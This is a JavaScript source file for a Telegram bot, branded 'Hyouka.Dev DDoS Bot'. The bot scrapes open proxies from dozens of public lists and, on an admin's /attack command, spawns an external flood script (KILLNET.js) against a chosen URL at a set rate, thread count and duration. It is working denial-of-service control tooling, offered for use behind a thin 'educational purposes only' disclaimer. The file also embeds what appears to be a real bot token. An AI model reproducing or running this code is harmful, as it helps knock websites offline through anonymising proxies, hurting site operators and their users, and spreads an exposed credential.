const { Telegraf } = require('telegraf');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');
const https = require('https');

const BOT_TOKEN = '8550353548:AAH-tRt_qooIqY4XdL_T8AtkZ0iRwnQXXCI'; 
const ADMIN_IDS = [7980616978];
const PROXY_SOURCES = [
    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
    'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
     'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt',
'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5',
'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5',
'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true',
'https://www.proxyscan.io/download?type=http',
'https://proxyspace.pro/socks5.txt',
'https://proxyspace.pro/http.txt',
'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
'https://www.proxy-list.download/api/v1/get?type=http',
'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
'http://freeproxylist-daily.blogspot.com/2013/05/usa-proxy-list-2013-05-15-0111-am-gmt8.html',
'http://freeproxylist-daily.blogspot.com/2013/05/usa-proxy-list-2013-05-13-812-gmt7.html',
'http://vipprox.blogspot.com/2013_06_01_archive.html',
'http://vipprox.blogspot.com/2013/05/us-proxy-servers-74_24.html',
'http://vipprox.blogspot.com/p/blog-page_7.html',
'http://vipprox.blogspot.com/2013/05/us-proxy-servers-199_20.html',
'http://vipprox.blogspot.com/2013_02_01_archive.html',
'http://alexa.lr2b.com/proxylist.txt',
'http://vipprox.blogspot.com/2013_03_01_archive.html',
'http://browse.feedreader.com/c/Proxy_Server_List-1/449196251',
'http://free-ssh.blogspot.com/feeds/posts/default',
'http://browse.feedreader.com/c/Proxy_Server_List-1/449196259',
'http://sockproxy.blogspot.com/2013/04/11-04-13-socks-45.html',
'http://proxyfirenet.blogspot.com/',
'https://www.javatpoint.com/proxy-server-list',
'https://openproxy.space/list/http',
'http://proxydb.net/',
'http://olaf4snow.com/public/proxy.txt',
'https://openproxy.space/list/socks4',
'https://openproxy.space/list/socks5',
'http://rammstein.narod.ru/proxy.html',
'http://greenrain.bos.ru/R_Stuff/Proxy.htm',
'http://inav.chat.ru/ftp/proxy.txt',
'http://johnstudio0.tripod.com/index1.htm',
'http://atomintersoft.com/transparent_proxy_list',
'http://atomintersoft.com/anonymous_proxy_list',
'http://atomintersoft.com/high_anonymity_elite_proxy_list',
'http://atomintersoft.com/products/alive-proxy/proxy-list/3128',
'http://atomintersoft.com/products/alive-proxy/proxy-list/com',
'http://atomintersoft.com/products/alive-proxy/proxy-list/high-anonymity/',
'http://atomintersoft.com/products/alive-proxy/socks5-list',
'http://atomintersoft.com/proxy_list_domain_com',
'http://atomintersoft.com/proxy_list_domain_edu',
'http://atomintersoft.com/proxy_list_domain_net',
'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
'http://atomintersoft.com/proxy_list_domain_org',
'http://atomintersoft.com/proxy_list_port_3128',
'http://atomintersoft.com/proxy_list_port_80',
'http://atomintersoft.com/proxy_list_port_8000',
'http://atomintersoft.com/proxy_list_port_81',
'http://hack-hack.chat.ru/proxy/allproxy.txt',
'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
'http://hack-hack.chat.ru/proxy/anon.tx',
'http://hack-hack.chat.ru/proxy/p1.txt',
'http://hack-hack.chat.ru/proxy/p2.txt',
'http://hack-hack.chat.ru/proxy/p3.txt',
'http://hack-hack.chat.ru/proxy/p4.txt',
'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt',
'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all',
'https://api.proxyscrape.com/?request=getproxies&proxytype=https&timeout=10000&country=all&ssl=all&anonymity=all',
'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    
];

const bot = new Telegraf(BOT_TOKEN);
let attackProcess = null;
let isAttacking = false;

const ANIME_GIFS = [
    'https://i.pinimg.com/originals/a2/a8/a9/a2a8a90329d7030440947c6e3a711a16.gif',
    'https://vibe.shadee.care/wp-content/uploads/2025/08/tumblr_8da473cad5739d97bddedb0913c4f784_bbb9dbb1_540.gif',
    'https://vibe.shadee.care/wp-content/uploads/2025/08/c1f413a04191d89be1fa.gif',
    'https://media.tenor.com/qJZfFj-b8WUAAAAM/rintaro-tsumugi-tsumugi-rintaro.gif',
    'https://i.pinimg.com/originals/4d/fb/08/4dfb086f5f00d5ad104900f21fe5f407.gif'
];

const HYOUKA_ART = `
╔═══════════════════════════════════════╗
║      🌀 HYOUKA.DEV DDoS BOT 🌀       ║
║    🔥 Professional Attack System     ║
║      🚀 Auto-Proxy Downloader        ║
╚═══════════════════════════════════════╝
`;

async function downloadProxies() {
    console.log('🔄 Downloading fresh proxies...');
    let allProxies = [];
    
    for (const source of PROXY_SOURCES) {
        try {
            const response = await axios.get(source, { timeout: 10000 });
            const proxies = response.data.split('\n')
                .map(p => p.trim())
                .filter(p => p.length > 0 && p.includes(':'))
                .filter(p => !p.includes('#'))
                .filter(p => !p.includes('//'));
            
            allProxies = [...allProxies, ...proxies];
            console.log(`✅ Added ${proxies.length} proxies from ${source}`);
        } catch (error) {
            console.log(`❌ Failed to fetch from ${source}: ${error.message}`);
        }
    }
    
    const uniqueProxies = [...new Set(allProxies)];
    
    fs.writeFileSync('proxy.txt', uniqueProxies.join('\n'));
    console.log(`💾 Saved ${uniqueProxies.length} unique proxies to proxy.txt`);
    
    return uniqueProxies.length;
}

async function updateProxiesPeriodically() {
    setInterval(async () => {
        if (!isAttacking) {
            await downloadProxies();
        }
    }, 3600000);
}

function startAttack(target, time, rps, threads) {
    if (!fs.existsSync('proxy.txt')) {
        throw new Error('proxy.txt not found! Run /proxies first.');
    }
    
    if (attackProcess) {
        attackProcess.kill();
    }
    
    const args = [
        'KILLNET.js',
        target,
        time.toString(),
        rps.toString(),
        threads.toString(),
        'proxy.txt'
    ];
    
    attackProcess = spawn('node', args, {
        stdio: 'pipe',
        detached: false
    });
    
    attackProcess.stdout.on('data', (data) => {
        console.log(`📡 Attack Output: ${data.toString()}`);
    });
    
    attackProcess.stderr.on('data', (data) => {
        console.error(`⚠️ Attack Error: ${data.toString()}`);
    });
    
    attackProcess.on('close', (code) => {
        console.log(`🔚 Attack process exited with code ${code}`);
        attackProcess = null;
        isAttacking = false;
    });
    
    isAttacking = true;
    return attackProcess;
}

bot.start((ctx) => {
    ctx.replyWithAnimation(
        { url: 'https://i.pinimg.com/originals/4d/fb/08/4dfb086f5f00d5ad104900f21fe5f407.gif' },
        {
            caption: `${HYOUKA_ART}\n\n🎮 *Welcome to Hyouka.Dev DDoS Bot*\n\n` +
                     `📋 *Available Commands:*\n` +
                     `🔄 /proxies - Download fresh proxies\n` +
                     `🎯 /attack <url> <time> <rps> <threads> - Start attack\n` +
                     `⏹️ /stop - Stop current attack\n` +
                     `📊 /status - Check bot status\n` +
                     `🛠️ /help - Show help menu\n\n` +
                     `⚡ *Made by Hyouka.Dev*`,
            parse_mode: 'Markdown'
        }
    );
});

bot.command('proxies', async (ctx) => {
    if (!ADMIN_IDS.includes(ctx.from.id)) {
        return ctx.reply('❌ Unauthorized access!');
    }
    
    const message = await ctx.reply('🔄 Downloading proxies from multiple sources...\nEstimated time: 30 seconds');
    
    try {
        const count = await downloadProxies();
        
        await ctx.replyWithDocument(
            { source: 'proxy.txt' },
            {
                caption: `✅ Successfully downloaded ${count} proxies!\n` +
                        `📁 File saved as: proxy.txt\n` +
                        `🔄 Auto-update: Every 60 minutes\n` +
                        `⚡ Made by Hyouka.Dev`,
                parse_mode: 'Markdown'
            }
        );
        
        ctx.deleteMessage(message.message_id);
    } catch (error) {
        ctx.reply(`❌ Error: ${error.message}`);
    }
});

bot.command('attack', async (ctx) => {
    if (!ADMIN_IDS.includes(ctx.from.id)) {
        return ctx.reply('❌ Unauthorized access!');
    }
    
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args.length < 4) {
        return ctx.reply(
            '🎯 *Usage:* /attack <url> <time> <rps> <threads>\n\n' +
            '*Example:* /attack https://example.com 60 1000 50\n\n' +
            '📝 *Parameters:*\n' +
            '• URL: Target website\n' +
            '• Time: Attack duration (seconds)\n' +
            '• RPS: Requests per second\n' +
            '• Threads: Number of concurrent threads\n\n' +
            '⚡ *Made by Hyouka.Dev*',
            { parse_mode: 'Markdown' }
        );
    }
    
    const [target, time, rps, threads] = args;
    
    try {
        new URL(target);
    } catch {
        return ctx.reply('❌ Invalid URL format!');
    }
    
    if (!fs.existsSync('proxy.txt')) {
        return ctx.reply('❌ No proxies found! Run /proxies first.');
    }
    
    const proxyCount = fs.readFileSync('proxy.txt', 'utf-8').split('\n').length;
    
    const randomGif = ANIME_GIFS[Math.floor(Math.random() * ANIME_GIFS.length)];
    const attackMsg = await ctx.replyWithAnimation(
        { url: randomGif },
        {
            caption: `⚡ *ATTACK INITIATED* ⚡\n\n` +
                    `🎯 Target: ${target}\n` +
                    `⏱️ Duration: ${time} seconds\n` +
                    `📊 RPS: ${rps}\n` +
                    `🧵 Threads: ${threads}\n` +
                    `🔗 Proxies: ${proxyCount} active\n` +
                    `🕐 Started: ${new Date().toLocaleTimeString()}\n\n` +
                    `🌀 *Hyouka.Dev Attack System*`,
            parse_mode: 'Markdown'
        }
    );
    
    try {
        startAttack(target, parseInt(time), parseInt(rps), parseInt(threads));
        
        const statusInterval = setInterval(() => {
            if (!isAttacking) {
                clearInterval(statusInterval);
                ctx.editMessageCaption(
                    `✅ *ATTACK COMPLETED* ✅\n\n` +
                    `🎯 Target: ${target}\n` +
                    `⏱️ Duration: ${time} seconds\n` +
                    `📊 RPS: ${rps}\n` +
                    `🧵 Threads: ${threads}\n` +
                    `🕐 Finished: ${new Date().toLocaleTimeString()}\n\n` +
                    `🎌 Attack successfully executed!\n` +
                    `⚡ Made by Hyouka.Dev`,
                    {
                        chat_id: attackMsg.chat.id,
                        message_id: attackMsg.message_id,
                        parse_mode: 'Markdown'
                    }
                );
            }
        }, 5000);
        
    } catch (error) {
        ctx.reply(`❌ Attack failed: ${error.message}`);
    }
});

bot.command('stop', (ctx) => {
    if (!ADMIN_IDS.includes(ctx.from.id)) {
        return ctx.reply('❌ Unauthorized access!');
    }
    
    if (attackProcess) {
        attackProcess.kill();
        attackProcess = null;
        isAttacking = false;
        ctx.reply('🛑 Attack stopped successfully!\n⚡ Made by Hyouka.Dev');
    } else {
        ctx.reply('⚠️ No active attack to stop.');
    }
});

bot.command('status', (ctx) => {
    const proxyFile = fs.existsSync('proxy.txt') 
        ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').length 
        : 0;
    
    const statusMessage = 
        `📊 *BOT STATUS* 📊\n\n` +
        `⚡ Attack Status: ${isAttacking ? 'ACTIVE 🔥' : 'INACTIVE 💤'}\n` +
        `🔗 Loaded Proxies: ${proxyFile}\n` +
        `🔄 Auto-Update: ${proxyFile > 0 ? 'ENABLED ✅' : 'DISABLED ❌'}\n` +
        `📁 Files: ${fs.existsSync('proxy.txt') ? 'proxy.txt ✅' : 'proxy.txt ❌'}\n` +
        `🖥️ System: Node.js ${process.version}\n\n` +
        `🌀 *Hyouka.Dev Monitoring System*\n` +
        `⏰ Last Check: ${new Date().toLocaleString()}`;
    
    ctx.reply(statusMessage, { parse_mode: 'Markdown' });
});

bot.command('help', (ctx) => {
    ctx.replyWithMarkdown(
        `🆘 *HELP MENU* 🆘\n\n` +
        `*⚡ Hyouka.Dev DDoS Bot v2.0*\n\n` +
        `*🔧 Features:*\n` +
        `• Auto-proxy downloading from multiple sources\n` +
        `• HTTP/HTTPS attack capabilities\n` +
        `• Real-time attack monitoring\n` +
        `• Anime UI with attack animations\n` +
        `• Auto-proxy refresh every hour\n\n` +
        `*📋 Commands:*\n` +
        `/start - Initialize bot\n` +
        `/proxies - Download fresh proxies\n` +
        `/attack <url> <time> <rps> <threads> - Start DDoS attack\n` +
        `/stop - Stop current attack\n` +
        `/status - Check bot status\n` +
        `/help - Show this menu\n\n` +
        `*⚠️ Important Notes:*\n` +
        `• This tool is for educational purposes only\n` +
        `• You are responsible for your actions\n` +
        `• Keep your bot token secure\n` +
        `• Use only on authorized targets\n\n` +
        `*🎌 Made by Hyouka.Dev*\n` +
        `*🔒 Keep this information private*`
    );
});

bot.catch((err, ctx) => {
    console.error(`Bot error: ${err}`);
    ctx.reply('❌ An error occurred. Check console for details.');
});

async function initializeBot() {
    console.log(HYOUKA_ART);
    console.log('🚀 Initializing Hyouka.Dev DDoS Bot...');
    
    if (!fs.existsSync('proxy.txt')) {
        fs.writeFileSync('proxy.txt', '');
        console.log('📁 Created empty proxy.txt');
    }
    
    if (!fs.existsSync('KILLNET.js')) {
        console.log('⚠️ Warning: KILLNET.js not found! Attacks will fail.');
    }
    
    updateProxiesPeriodically();
    
    bot.launch()
        .then(() => {
            console.log('✅ Bot successfully launched!');
            console.log('⚡ Made by Hyouka.Dev');
            console.log('📱 Bot is now listening for commands...');
        })
        .catch(err => {
            console.error('❌ Failed to launch bot:', err);
        });
}

process.once('SIGINT', () => {
    bot.stop('SIGINT');
    if (attackProcess) attackProcess.kill();
    console.log('🛑 Bot stopped. Made by Hyouka.Dev');
});

process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
    if (attackProcess) attackProcess.kill();
    console.log('🛑 Bot stopped. Made by Hyouka.Dev');
});

initializeBot();

module.exports = bot;
